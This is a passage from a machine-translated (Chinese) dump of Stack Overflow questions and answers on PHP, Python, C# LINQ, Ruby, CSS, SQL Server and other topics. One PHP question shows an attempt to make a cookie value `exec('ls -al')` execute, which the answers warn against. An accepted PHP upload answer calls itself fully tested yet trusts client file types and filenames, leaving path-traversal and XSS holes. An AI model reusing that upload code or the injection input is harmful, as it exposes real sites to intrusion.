我相信，有了这个积木后，我可以做两件事：制作实时价格表（即，Apple Online Store 点击一个框，价格会实时变化）并为我们个人进行自动合同数学计算。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:27:53.123

首先，您需要像这样命名文本框：

```
Math:<input type="text" id="MathTB"/> 
```

[这是 jQuery“Keyup”功能的参考网站](http://api.jquery.com/keyup/)

[和 ID 选择器](http://api.jquery.com/id-selector/)

```
var mathTextBox = $("#MathTB");  
mathTextBox.keyup(function () {
    var value = mathtextbox.val();
    value *= 4;
    mathTextBox.val(value);
}); 
```

使用 jquery，这应该可以让您到达您想要去的地方。

请继续使用该网站作为第一资源，您很快就会成为专家。

# python - 具有范围的 Python 列表

> ID：14469145
> 
> 赞同：1
> 
> 时间：2013-01-22T22:21:56.207
> 
> 标签：python

假设我有一个年龄列表（代表一个国家的预期寿命）：

```
ages= ['70.37668898', '72.15779044', '73.25278702', '72.18979793', '80.73137673','55.43124818' '54.16265064', '54.16540964', ...] 
```

现在我的预期寿命范围增加了两倍（范围 48-100），如下所示：

```
48-50,50-52, ...., 98-100 
```

我想创建一个新列表，其中包含每个年龄段的列表。如果给定的年龄在预期寿命范围内，则内部列表包含 1，否则为 0。

所以结果看起来像这样：

每个内部列表都属于年龄范围内的一个年龄

```
[[0,0,0,0,1, ..., 0],[0,1,0,0,0, ..., 0],...] 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T22:30:50.430

您的范围结构有点模糊。让我们假设你的范围是这样的

```
ranges = [(48,50),(50,52),...(98,100)] 
```

现在

```
ages= ['70.37668898', '72.15779044', '73.25278702', '72.18979793', '80.73137673','55.43124818' '54.16265064', '54.16540964', ...]

result = [ [ 1 if (r[0] <= age <= r[1]) else 0 for r in ranges] for age in ages] 
```

或者，如果您的范围是固定的，从 50 到 100 以 2 为增量，您可以使用生成器：

```
result = [ [ 1 if (r[0] <= age <= r[1]) else 0 for r in ( (i-2,i) for i in range(50,100,2)) ] for age in ages] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:29:22.483

```
ages = [70.37668898, 72.15779044, 73.25278702, 72.18979793, 80.73137673, 55.43124818, 54.16265064, 54.16540964]
[[int(age >= 48+2*i and age <50+2*i) for i in range(25)] for age in ages] 
```

结果是

```
[[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]] 
```

这（也许）是你问的。

# ios - 具有内置邮件外观的自定义 UIActivity

> ID：14469148
> 
> 赞同：0
> 
> 时间：2013-01-22T22:22:14.663
> 
> 标签：ios, uiactivityviewcontroller, uiactivity

我希望将 UIActivityController 与标准活动一起使用来共享 UIImage。但是，当用户选择邮件时，我想做我自己的逻辑：呈现一个表单让用户选择一些选项，然后自己撰写电子邮件，以便我可以将自己的正文和附件添加到电子邮件中。

有没有办法做到这一点？

我知道我可以创建一个自定义 UIActivity，但是我必须提供一个自定义图像，该图像将显示为灰色，并且标准邮件图标会更容易识别。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-25T10:43:09.397

不幸的是，没有办法自定义内置的 UIActivities，例如（电子邮件、Twitter、Facebook）。

您只能自定义要在这些频道上共享的项目。

# php - 显示从 $_FILES 上传的文件

> ID：14469151
> 
> 赞同：2
> 
> 时间：2013-01-22T22:22:37.030
> 
> 标签：php, html, web-applications

我在将文件从 HTML 上传到基于 PHP 的 Web 服务器时遇到了一些问题。以下是我的 HTML 代码。我相信这里没有问题。

```
<html>
 <body>

  <form action="upload.php" method="post"
   enctype="multipart/form-data" action="2.2.2.cgi">
   <input type="file" name="file" id="file" size="35"><br>
   <input type="submit" name="submit" id="submit" value="Submit">
  </form>

 </body>
</html> 
```

PHP代码：

```
<?php

define ('MAX_FILE_SIZE', 1000000);

$permitted = array('image/gif', 'image/jpeg', 'image/png', 'image/pjpeg', 'text/plain');

if  ($_FILES['file']['type'] == $permitted 
    && $_FILES['file']['size'] > 0 
    && $_FILES['file']['size'] <= MAX_FILE_SIZE) {
      move_uploaded_file($_FILES, $uploadedfile);
      echo ('<img src="'.$uploadedfile'" />');
}
?> 
```

我不知道如何使它在 PHP 中工作。我一直在尝试几种不同的方法，上面的代码只是我最近一次绝望的尝试，试图通过将值存储到一个新变量中来解决这个问题。我想要做的是以下内容：

*   限制可以上传的文件的类型和大小。
*   文件是图片吗？显示图片。
*   是纯文本文件吗？显示文件的内容。
*   它是未经许可的文件吗？显示文件的名称、类型和大小。

任何形式的提示或帮助将不胜感激。谢谢！

PS。它不会上线，因此目前任何安全问题都无关紧要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:24:55.137

好的。完全测试和注释的代码。

**上传.php**

```
define ('MAX_FILE_SIZE', 1000000);

$permitted = array('image/gif', 'image/jpeg', 'image/png', 'image/pjpeg', 'text/plain'); //Set array of permitted filetypes
$error = true; //Define an error boolean variable
$filetype = ""; //Just define it empty.

foreach( $permitted as $key => $value ) //Run through all permitted filetypes
{
  if( $_FILES['file']['type'] == $value ) //If this filetype is actually permitted
    {
        $error = false; //Yay! We can go through
        $filetype = explode("/",$_FILES['file']['type']); //Save the filetype and explode it into an array at /
        $filetype = $filetype[0]; //Take the first part. Image/text etc and stomp it into the filetype variable
    }
}

if  ($_FILES['file']['size'] > 0 && $_FILES['file']['size'] <= MAX_FILE_SIZE) //Check for the size
{
    if( $error == false ) //If the file is permitted
    {
        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]); //Move the file from the temporary position till a new one.
              if( $filetype == "image" ) //If the filetype is image, show it!
              {
                echo '<img src="upload/'.$_FILES["file"]["name"].'">';
              }
              elseif($filetype == "text") //If its text, print it.
              {
                echo nl2br( file_get_contents("upload/".$_FILES["file"]["name"]) );
              }

    }
    else
    {
        echo "Not permitted filetype.";
    }
}
else
{
  echo "File is too large.";
} 
```

与此表单一起使用 **form.html**

```
 <form action="upload.php" method="post"
   enctype="multipart/form-data" action="upload.php">
   <input type="file" name="file" id="file" size="35"><br>
   <input type="submit" name="submit" id="submit" value="Submit">
  </form>

 </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-08-24T17:08:20.477

认为事情发生了一些变化，所以这里有一个受 Jonas 代码启发的片段，它已经过全面测试

```
 foreach ($_FILES as $File) {

        $file_ext  = explode('/', $File['type'])[1];
        $file_type = explode('/', $File['type'])[0];

        // Validate type
        if(!in_array($File['type'], $allowed_types)) {
            echo "File type not permitted";
            continue;
        }

        // Validate size
        if  ($File['size'] >= $max_size) {
            echo "File is too large.";
            continue;
        }

        if($file_type == 'image') {
            $imageData = file_get_contents($File['tmp_name']); // path to file like /var/tmp/...
            echo '<img src="data:image/'.$file_ext.';base64,'.base64_encode($imageData).'" />';
        }

    } 
```

# php - PHP $_COOKIE 参数执行

> ID：14469154
> 
> 赞同：0
> 
> 时间：2013-01-22T22:22:47.903
> 
> 标签：php, cookies

我找不到以下请求失败的原因
我的 php 代码是：

```
if (isset($_COOKIE["user"])) {
   echo '<p><h3><strong>Welcome '.$_COOKIE["param"].'</strong></h3></p>'; ..... 
```

当我作为参数请求时`exec('ls -al')`，php 代码没有运行该命令。

在请求的响应中，它就像参数化：

```
Welcome exec('ls -al') 
```

这次执行失败的原因可能是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:30:39.213

`$_COOKIE["param"]`是一个字符串。你在呼应它。它**不**应该运行任何东西。

如果您想在 PHP 中运行命令，则必须使用[`eval()`](http://php.net/manual/en/function.eval.php). 但是对于从 cookie 值运行命令：

**不要这样做！**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:30:17.110

所以你说 is 的值`$_COOKIE['param']`，`exec('ls -al')`并且你期望它在你结束时运行`echo`？

这不是它的工作原理。该 cookie 的值将是*字符串值*“exec('ls -al')”，而不是执行代码的结果。如果你想一想，你就会明白为什么让 cookie 能够自动执行代码是个坏主意。

`exec()`无论如何运行随机命令并不是一个好主意，*特别是*如果该输入来自用户（哪些 cookie 可以 - 用户可以并且将更改它们以尝试攻击您）。

相反，您应该使用其他输入，您的代码可以将其解释为运行某些代码的信号。例如，您可以让`param`值保存字符串`list files`，您的代码会看到该值并`exec('ls -al')`为您运行。

但是，您*仍然*不应该`exec`编写代码来执行此操作，因为这样很容易意外运行危险的命令。相反，您应该尽可能多地使用 PHP 的内置函数，并且仅在清理您的输入并且只运行已知值之后。

对于您的情况，PHP 有[很多函数](http://ca.php.net/manual/en/refs.fileprocess.file.php)可以让您与服务器的文件系统进行交互。使用这些来获取系统上的文件列表。

# c# - LINQ SelectMany 和 Where 扩展方法忽略空值

> ID：14469159
> 
> 赞同：36
> 
> 时间：2013-01-22T22:23:00.957
> 
> 标签：c#, linq, .net-4.0, linq-to-objects

我有下面的示例代码，我很想知道如何让这个更干净，可能通过更好地使用`SelectMany()`. 此时该`QuestionList`属性不会为空。我想要的只是一个`answerRows`不是的列表`null`，但`Questions`有时也可以`null`。

```
IEnumerable<IQuestion> questions = survey.QuestionList
                    .Where(q => q.Questions != null)
                    .SelectMany(q => q.Questions);

if(questions == null)
return null;

IEnumerable<IAnswerRow> answerRows = questions
                    .Where(q => q.AnswerRows != null)
                    .SelectMany(q => q.AnswerRows);

if(answerRows == null)
return null; 
```

我对 Jon 对`Enumerable.SelectMany`和 Null 的评论很感兴趣。所以我想用一些假数据尝试我的示例，以便更容易地查看错误在哪里，请参阅下文，特别是我如何使用`SelectMany()`a 的结果`SelectMany()`，它更清楚我现在的问题是必须确保您不要`SelectMany()`在空引用上使用，当我实际阅读`NullReferenceException`名称时很明显:( 最后将它们放在一起。

同样在执行此操作时，我意识到`try { } catch() { }`在此示例中使用 是无用的，并且像往常一样 Jon Skeet 有[答案](https://stackoverflow.com/questions/1998566/unhandled-exception-in-try-catch) :) 延迟执行..

因此，如果您想查看第 2 行的异常，请注释掉相关的第 1 行位：P，抱歉，如果不重新编写代码示例，我无法弄清楚如何停止此错误。

```
using System;
using System.Collections.Generic;
using System.Linq;

namespace SelectManyExample
{
    class Program
    {
        static void Main(string[] args)
        {
            var questionGroupList1 = new List<QuestionGroup>() {
                new QuestionGroup() {
                    Questions = new List<Question>() {
                        new Question() {
                            AnswerRows = new List<AnswerRow>() {
                                new AnswerRow(),
                                new AnswerRow()
                            }
                        },

                        // empty question, causes cascading SelectMany to throw a NullReferenceException
                        null,

                        new Question() {
                            AnswerRows = new List<AnswerRow>() {
                                new AnswerRow() {
                                    Answers = new List<Answer>() {
                                        new Answer(),
                                        new Answer()
                                    }
                                }
                            }
                        }
                    }
                }
            };

            var questionGroupList2 = new List<QuestionGroup>() {
                null,
                new QuestionGroup()
            };

            IEnumerable<AnswerRow> answerRows1 = null;
            IEnumerable<AnswerRow> answerRows2 = null;

            try
            {
                answerRows1 = questionGroupList1
                    .SelectMany(q => q.Questions)
                    .SelectMany(q => q.AnswerRows);
            }
            catch(Exception e) {
                Console.WriteLine("row 1 error = " + e.Message);
            }

            try
            {
                answerRows2 = questionGroupList2
                    .SelectMany(q => q.Questions)
                    .SelectMany(q => q.AnswerRows);
            }
            catch (Exception e)
            {
                Console.WriteLine("row 2 error = " + e.Message);
            }

            Console.WriteLine("row 1: " + answerRows1.Count());
            Console.WriteLine("row 2: " + answerRows2.Count());
            Console.ReadLine();
        }

    }

    public class QuestionGroup {
        public IEnumerable<Question> Questions { get; set; }
    }

    public class Question {
        public IEnumerable<AnswerRow> AnswerRows { get; set; }
    }

    public class AnswerRow {
        public IEnumerable<Answer> Answers { get; set; }
    }

    public class Answer {
        public string Name { get; set; }
    }
} 
```

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2013-01-22T22:25:24.950

```
survey.QuestionList
    .Where(l => l.Questions != null)
    .SelectMany(l => l.Questions)
    .Where(q => q != null && q.AnswerRows != null)
    .SelectMany(q => q.AnswerRows); 
```

我建议您确保您的收藏永远不会`null`. `null`如果处理不好，可能会有点麻烦。你最终得到`if (something != null) {}`了你所有的代码。然后使用：

```
survey.QuestionList
    .SelectMany(l => l.Questions)
    .SelectMany(q => q.AnswerRows); 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-01-22T22:38:03.363

```
public static IEnumerable<TResult> SelectNotNull<TSource, TResult>(
    this IEnumerable<TSource> source, Func<TSource, IEnumerable<TResult>> selector)
    where TResult : class
{
    return source.Select(selector)
        .Where(sequence => sequence != null)
        .SelectMany(x => x)
        .Where(item => item != null);
} 
```

然后，您可以执行以下操作：

```
var allAnswers = survey.QuestionList
    .SelectNotNull(list => list.Questions)
    .SelectNotNull(question => question.AnswerRows); 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2019-07-01T08:36:27.353

符合 DRY 的解决方案是在lambda 表达式中使用[null-coalescing 运算符。`??`](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/null-coalescing-operator)`SelectMany`

```
IEnumerable<IQuestion> questions = survey.QuestionList.SelectMany(q => q.Questions ?? Enumerable.Empty<IQuestion>());

IEnumerable<IAnswerRow> answerRows = questions.SelectMany(q => q.AnswerRows ?? Enumerable.Empty<IAnswerRow>()); 
```

在 OP 的代码和上面的代码中，`questions`并且`answerRows`永远不会为 null，因此不需要进行 null 检查（您可能希望`.Any()`根据您的业务逻辑进行检查）。`q.Questions`但是如果或`q.AnswerRows`为空，上面的代码也永远不会导致异常。

# python - 在循环行中调用函数并将返回值存储到变量然后在循环中使用？

> ID：14469163
> 
> 赞同：4
> 
> 时间：2013-01-22T22:23:23.177
> 
> 标签：python, loops, while-loop

我想做如下的事情：

```
while myFunc() as myVar:
    print myVar 
```

基本上，只需在循环行中调用一个函数，该函数将返回一个值并根据该值继续循环，但我也希望能够在循环中使用该值，我宁愿不必调用函数 a第二次。

我想避免的：

```
while myFunc():
    myVar = myFunc()
    print myVar 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:28:43.723

[`iter()`](http://docs.python.org/2/library/functions.html#iter)您可以使用内置函数的两个参数版本来完成此操作：

```
for myVar in iter(myFunc, sentinel):
    print myVar 
```

这等效于以下内容：

```
while True:
    myVar = myFunc()
    if myVar == sentinel:
        break
    print myVar 
```

从文档中`iter()`：

> 如果给定第二个参数*sentinel*，则*o*必须是可调用对象。在这种情况下创建的迭代器将在每次调用其方法时调用不带参数的*o ；*`next()`如果返回的值等于哨兵，`StopIteration`将被提升，否则将返回该值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:27:28.783

使用返回该值的生成器。

```
for myVal in myFunc():
 print myVal 
```

这是与 yield 语句相结合的。

# ruby - 仅当`时如何获取`HREF`值 税 ?

> ID：14469167
> 
> 赞同：-1
> 
> 时间：2013-01-22T22:23:35.000
> 
> 标签：ruby, mechanize, selenium-webdriver

```
<fieldset class="attachmentTable large"><legend>SMF</legend>
<table cellspacing="2" cellpadding="2" border="0">
<tr>
<td>

<a href="

/aems/file/test.html">

</a>
</td>
<td>

foo     

</td>
</tr>
</table>
</fieldset>

<fieldset class="attachmentTable large"><legend>tax</legend>
<table cellspacing="2" cellpadding="2" border="0">
<tr>
<td>

<a href="

/relf/file/test.html">

</a>
</td>
<td>

foo     

</td>
</tr>
</table>
</fieldset> 
```

我有一个来自网页的 html 源代码，上面给出了其中的一部分。现在我只想在什么`HREF`时候获取值`<legend>tax</legend>`？那么你们可以在这里帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T01:08:37.737

我会做：

```
page.search('legend[text()="tax"] + table a').each do |a|
  puts a[:href]
end 
```

# perl - 模板工具包浏览器检测

> ID：14469171
> 
> 赞同：1
> 
> 时间：2013-01-22T22:23:55.683
> 
> 标签：perl, template-toolkit

有没有办法通过模板工具包检测您正在使用的浏览器？例如，我可以使用 jQuery 实现我想要做的事情，但我认为如果可能的话，知道如何在模板工具包中做到这一点会很有用？

jQuery

```
 <script>
    jQuery(window).load(function(){
        if ( (jQuery.browser.msie && jQuery.browser.version < 9.0) )
        {
            jQuery('body').addClass('old-ie');
        }
    });
    </script> 
```

在模板工具包中，我想做类似下面的事情，但在任何地方的文档中都看不到这个？

```
 <body 
    [% IF browser.msie && browser.version < 9.0 %]
    class="old-ie"
    [% ELSE %]
    [% END %]
    > 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:46:26.667

您可以通过 HTTP 请求标头做到这一点。您没有提到调用 TT 的内容，但如果您使用的是 Catalyst，则可以使用[Catalyst::TraitFor::Request::BrowserDetect](https://metacpan.org/module/Catalyst%3a%3aTraitFor%3a%3aRequest%3a%3aBrowserDetect)，然后将变量传递给 TT 以说明正在请求页面的浏览器类型。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T23:04:42.150

我不知道有一个 TT 插件可以解决这个问题，但是在后端应用程序中添加一两行以使模板可以使用信息是很简单的。例如，如果您的应用程序是基于 Catalyst 的，您可以在主程序中添加如下内容：

```
__PACKAGE__->apply_request_class_roles(qw/
    Catalyst::TraitFor::Request::BrowserDetect
/); 
```

...并在您的“自动”处理程序中，引入诸如（未经测试）之类的行：

```
$c->stash(browser => $c->req->browser); 
```

...或者只是使用这是您的模板：

```
[%- SET browser = c.req.browser;
    SET old_ie = 'class="old-ie"'
        IF browser.windows && browser.ie && browser.public_major < 9.0;
-%] 
```

然后`old_ie`在模板中包含任何需要的地方。

有关更多信息和选项，请参阅[Catalyst::TraitFor::Request::BrowserDetect](https://metacpan.org/module/Catalyst%3a%3aTraitFor%3a%3aRequest%3a%3aBrowserDetect)和[HTTP::BrowserDetect](https://metacpan.org/module/HTTP%3a%3aBrowserDetect)。我确信 Dancer、Mojolicious 等也有类似的插件/方法。

# facebook - 喜欢一项活动与喜欢 Facebook 上的一项业务是一回事吗？

> ID：14469175
> 
> 赞同：0
> 
> 时间：2013-01-22T22:24:14.677
> 
> 标签：facebook, facebook-graph-api, facebook-like

2 部分问题

1）所以我试图找出在 pinterest 上“喜欢”某物与“喜欢”一个企业之间的区别。是一样的吗？

2）我想在我的网站上实现人们“喜欢”不同的页面（例如 pinterest）并跟踪哪个页面有最多的喜欢。我是否必须在我的数据库中保存和跟踪它，或者 facebook API 会让我根据某些标准查看哪些页面最喜欢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:55:21.883

TLDR：是的，它们是一样的。

Facebook“点赞”是什么是[Open Graph Action](https://developers.facebook.com/docs/technical-guides/opengraph/)。从 Facebook Web 界面或通过其中一个 Facebook 插件喜欢某些东西，可以轻松实现路径。Pinterest 使用自定义脚本来启动[内置的点赞操作](https://developers.facebook.com/docs/technical-guides/opengraph/built-in-actions/likes/)。

两种类型的点赞都需要一个具有[开放图元数据](http://ogp.me)的对象，Facebook 可以抓取该对象以获取将在时间轴上共享的信息。Facebook 可以在内部页面或外部页面上提供该元数据。

至于获得喜欢的数量，是的，你可以。每个规范的开放图 URL 都会在 Facebook 系统中获得一个 id。这包括 Facebook 系统内的对象。

因此，Pinterest Facebook 页面的 id 为`253591661347566`. 你可以通过查询找到这个`https://graph.facebook.com/pinterest?fields=id`

Pinterest 主页的 id 为`185629821512802`根据`https://graph.facebook.com/http://pinterest.com?fields=id`。（为了清楚起见，没有进行urlencoded）。您可以替换`http://pinterest.com`为任何其他 url，并获取该页面 id。

对于您知道 id 的任何对象，您可以通过添加`likes`到`fields`查询字符串来获取有关它的点赞数的信息。

如果您使用应用程序 ID 和管理员信息标记了您的页面，您可以通过 Facebook 的[Insights](https://developers.facebook.com/docs/technical-guides/opengraph/insights/)查看所有这些以及更多信息。

# list - 如何将多个参数保存到地图？

> ID：14469177
> 
> 赞同：1
> 
> 时间：2013-01-22T22:24:32.447
> 
> 标签：list, scala, map, immutability

我正在使用数组形式的命令行参数，我想将其转换为地图。

因此，例如，当我运行我的代码时，`scala abc.scala A 10 B 20 C 30`我想要一个`Map(A->10, B->20, C->30)`. 我也只能使用 val 所以我不能重新分配它，因为它是不可变的。我没有成功使用以下代码：

```
val names = args.filter(x => for(i <- 0 to args.length-1) i%2==0)
val numbers = args.partition(args(i) => i%2==1)
names.zip(numbers).toMap 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-22T22:31:11.893

你想要`grouped`：

```
args.grouped(2).map { case Array(n,v) => (n,v) }.toMap 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-22T22:31:22.140

您`for`以完全错误的方式使用。这会运行 args 的每个元素的新迭代。如果您想要一个可以使用的索引，请尝试`args.zipWithIndex`（将索引与每个元素配对）。或者，查看`args.grouped(2)`.

# css - 使用 CSS 设置多个 div 样式

> ID：14469184
> 
> 赞同：0
> 
> 时间：2013-01-22T22:25:03.877
> 
> 标签：css

如何设置这些 div 的样式，以便它们显示在没有项目符号的 1 行上？

```
<div>
Copyright (c) 2013 Acme Inc. All rights reserved.
</div>

<div>
<ul>
<li><a href="#">Privacy Policy</a></li>
<li><a href="#">Terms &amp; Conditions</a></li>
</ul>
</div> 
```

示例：版权 (c) 2013 Acme Inc. 保留所有权利。隐私政策条款和条件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:34:48.770

```
<html>
<body>
<div style="display:inline">
Copyright (c) 2013 Acme Inc. All rights reserved.
</div>

<div style="display:inline">
<ul style="display:inline">
<li style="display:inline"><a href="#">Privacy Policy</a></li>
<li style="display:inline"><a href="#">Terms &amp; Conditions</a></li>
</ul>
</div>
   </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:28:39.060

您应该向`<ul>`或 父级添加一个类`<div>`。

```
<div class='copyright'>
Copyright (c) 2013 Acme Inc. All rights reserved.
</div>
<ul class='footer'>
     <li><a href="#">Privacy Policy</a></li>
     <li><a href="#">Terms &amp; Conditions</a></li>
</ul> 
```

然后调整CSS：

```
.footer {
    list-style-type: none;
    display: inline;
}

.footer li, .copyright {
    display: inline;
} 
```

或者

```
.footer li, .copyright {
    display: inline-block;
} 
```

或者

```
.footer li, .copyright {
    display: block;
    float: left;
} 
```

添加课程`.footer`是非常可选的，但我认为非常推荐。您可以简单地将 css 选择器调整为`ul { list-style-type: none; }`或`ul li { ... }`

**但老实说，你为什么不简单地使用它呢？**

```
<div>
 Copyright (c) 2013 Acme Inc. All rights reserved.
 <a href='#'>Privacy Policy</a> 
 <a href='#'>Terms &amp; Conditions</a>
</div> 
```

# c# - MVC4 网站只能在一台 PC 上运行，不能在其他 PC 上运行，失败并显示“SQL 网络接口，错误：26”

> ID：14469186
> 
> 赞同：2
> 
> 时间：2013-01-22T22:25:10.223
> 
> 标签：c#, sql-server, asp.net-mvc, entity-framework, ef-code-first

以下 MVC4`ef-codefirst`应用程序在我的计算机上运行良好，但在其他任何地方都没有。

两台计算机上都安装了 VS 2012 Ultimate 和 SQL Express。

两台计算机都使用此连接字符串：

```
<add name="DefaultConnection" connectionString="Data Source=(LocalDb)\v11.0;Initial Catalog=aspnet-AppointmentMVC4-20130118154339;
Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\aspnet-AppointmentMVC4-20130118154339.mdf"
providerName="System.Data.SqlClient" /> 
```

尝试从开发计算机以外的计算机访问数据库时：

> 建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：SQL 网络接口，错误：26 - 错误定位服务器/指定的实例）

工作机器有这个数据库连接： ![在此处输入图像描述](../Images/5cce954342dc034376e4b1578b0388ff.png)

使用`localDB`或`sqlexpress`作为连接无关紧要；让它成功很重要。

`DbContext`班级：

```
public class AppointmentContext : DbContext
{
    public DbSet<Appointment> Appointments { get; set; }
    public DbSet<User> Users { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:45:31.930

我认为 LocalDB 只支持通过命名管道协议进行本地连接。
[http://www.sqlcoffee.com/SQLServer2012_0004.htm](http://www.sqlcoffee.com/SQLServer2012_0004.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T11:49:06.560

不知何故，这解决了这一切。

```
<add name="AppointmentContext" connectionString="Data Source=
(LocalDb)\v11.0;AttachDBFilename=|DataDirectory|\Appointments.mdf" 
providerName="System.Data.SqlClient" /> 
```

感谢 Iraklis 和 jessehouwing 的帮助，很棒的社区。

# vaadin - Vaadin 通过链接加载另一个视图？

> ID：14469190
> 
> 赞同：2
> 
> 时间：2013-01-22T22:25:27.610
> 
> 标签：vaadin, vaadin7

请告诉我，这可能吗。

我有一个链接。

```
Link jobNameLink = new Link(jobName, new ExternalResource("opla")); 
```

当您单击此链接以下载不同的视图时，我需要这样做。如果不可能，这个问题的可能解决方案是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-23T10:44:22.203

你有两个选择：

使用按钮而不是链接：

```
Button button = new Button("Click me!", new Button.ClickListener() {
    @Override
    public void buttonClick(ClickEvent clickEvent) {
        // Logic for opening correct view
    }
});
button.setStyleName(Reindeer.BUTTON_LINK); 
```

或者使用 UriFragmentUtility (Vaadin 6) 或 UriFragmentChangedListener (Vaadin 7) 监听 URI 片段更改，然后您可以使用普通链接：这是 Vaadin 7 的示例：

```
Page.getCurrent().addUriFragmentChangedListener(new Page.UriFragmentChangedListener() {
    @Override
    public void uriFragmentChanged(Page.UriFragmentChangedEvent e) {
         System.out.println("fragment changed: " + e.getUriFragment());
    }
});

new Link("click me!", new ExternalResource("#asdf")) 
```

# objective-c - UILabel 地址标签为空白，本地声明隐藏实例变量

> ID：14469195
> 
> 赞同：0
> 
> 时间：2013-01-22T22:25:46.597
> 
> 标签：objective-c

我是 Xcode 的新手，我试图让我的应用程序访问通讯簿，选择一个人，然后为这个人创建 NSString 值（名字、姓氏、组织、地址、电子邮件和电话号码）我可以拉名字和姓氏，组织，输入的第一封电子邮件（最好显示所有电子邮件地址，并让用户选择），以及输入的第一个电话号码（再次，如果能够选择），但此人的地址始终为空白。我非常感谢您能提供的任何帮助。此外，我不断收到本地声明隐藏实例变量警告 - 我不知道如何解决这些问题。

```
#import "TACustomer.h"

@interface TACustomer ()

@end

@implementation TACustomer

@synthesize custfirstName;
@synthesize custlastName;
@synthesize custOrganization;
@synthesize custEmail;
@synthesize custAddress;
@synthesize custphoneNumber;

- (IBAction)showPicker:(id)sender
{
    // Creating the Address Book Picker
    ABPeoplePickerNavigationController *picker = [[ABPeoplePickerNavigationController alloc] init];
    // Place the delegate of the picker to the control.
    picker.peoplePickerDelegate = self;

    // Showing the picker.
    [self presentModalViewController:picker animated:YES];

}

- (void)peoplePickerNavigationControllerDidCancel:(ABPeoplePickerNavigationController *)peoplePicker
{
    //assigning control back to the main controller.
    [self dismissModalViewControllerAnimated:YES];

}

- (BOOL)peoplePickerNavigationController:(ABPeoplePickerNavigationController *)peoplePicker shouldContinueAfterSelectingPerson:(ABRecordRef)person
{

    [self displayPerson:person];

    [self dismissModalViewControllerAnimated:YES];

    return NO;

}

- (BOOL)peoplePickerNavigationController:(ABPeoplePickerNavigationController *)peoplePicker shouldContinueAfterSelectingPerson:(ABRecordRef)person
                            property:(ABPropertyID)property
                          identifier:(ABMultiValueIdentifier)identifier
{

    // Only inspect the value if it's an address.
    if (property == kABPersonAddressProperty)
    {

        //Set up an ABMultiValue to hold the address values; copy from a book record.
        ABMutableMultiValueRef multicustValue = ABRecordCopyValue(person, property);

        // Set up an NSArray and copy values into it.
        NSArray *thecustArray = (__bridge id)ABMultiValueCopyArrayOfAllValues(multicustValue);

        // Figure out which values we want and store the index.
        const NSUInteger customerIndex = ABMultiValueGetIndexForIdentifier (multicustValue, identifier);

        // Set up an NSDictionary to hold the contents of the array.
        NSDictionary *custDict = [thecustArray objectAtIndex:customerIndex];

        // Set up NSStrings to hold the keys and values. First, how many are there?
        const NSUInteger theCount = [custDict count];
        NSString * __unsafe_unretained keys[theCount];
        NSString *__unsafe_unretained values[theCount];

        // Get the keys and values from the CFDictionary.
        [custDict getObjects:values andKeys:keys];

        // Set the address label's text.
        NSString *customeraddress;
        customeraddress = [NSString stringWithFormat:@"%@, %@, %@, %@, %@",
                   [custDict objectForKey:(NSString *)kABPersonAddressStreetKey],
                   [custDict objectForKey:(NSString *)kABPersonAddressCityKey],
                   [custDict objectForKey:(NSString *)kABPersonAddressStateKey],
                   [custDict objectForKey:(NSString *)kABPersonAddressZIPKey],
                   [custDict objectForKey:(NSString *)kABPersonAddressCountryKey]];

        self.custAddress.text = customeraddress;

    }
        return NO;
}

- (void)displayPerson:(ABRecordRef)person
{

    // Get Customer First Name
